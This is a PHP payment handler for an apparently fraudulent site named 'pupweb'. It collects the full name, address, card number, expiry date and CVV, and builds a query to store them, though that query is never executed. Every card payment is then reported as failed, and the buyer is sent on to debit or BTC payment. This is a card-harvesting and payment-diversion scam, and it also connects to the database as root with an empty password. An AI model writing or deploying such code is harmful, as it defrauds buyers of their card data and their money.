<?php
// process_creditcard.php
// Replace with your actual DB credentials
$host = 'localhost';
$db   = 'pupweb_payments';
$user = 'root';
$pass = '';

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die('Connection failed: ' . $conn->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $fullname = $conn->real_escape_string($_POST['fullname'] ?? '');
    $address  = $conn->real_escape_string($_POST['address'] ?? '');
    $city     = $conn->real_escape_string($_POST['city'] ?? '');
    $state    = $conn->real_escape_string($_POST['state'] ?? '');
    $zip      = $conn->real_escape_string($_POST['zip'] ?? '');
    $country  = $conn->real_escape_string($_POST['country'] ?? '');
    $cardnum  = $conn->real_escape_string($_POST['cardnum'] ?? '');
    $exp      = $conn->real_escape_string($_POST['exp'] ?? '');
    $cvv      = $conn->real_escape_string($_POST['cvv'] ?? '');

    $sql = "INSERT INTO creditcard_payments (fullname, address, city, state, zip, country, cardnum, exp, cvv) VALUES ('$fullname', '$address', '$city', '$state', '$zip', '$country', '$cardnum', '$exp', '$cvv')";
    // Always show failure message and link to payment options
    echo '<h2>Credit card couldn\'t be processed</h2>';
    echo '<p>Your credit card could not be processed. Please proceed to debit and BTC payment option.</p>';
    echo '<a href="payment-options.html" style="color:#e67e22;font-weight:bold;text-decoration:underline;">Back to Payment Options</a>';
} else {
    echo '<h2>Invalid Request</h2>';
}
$conn->close();
?>
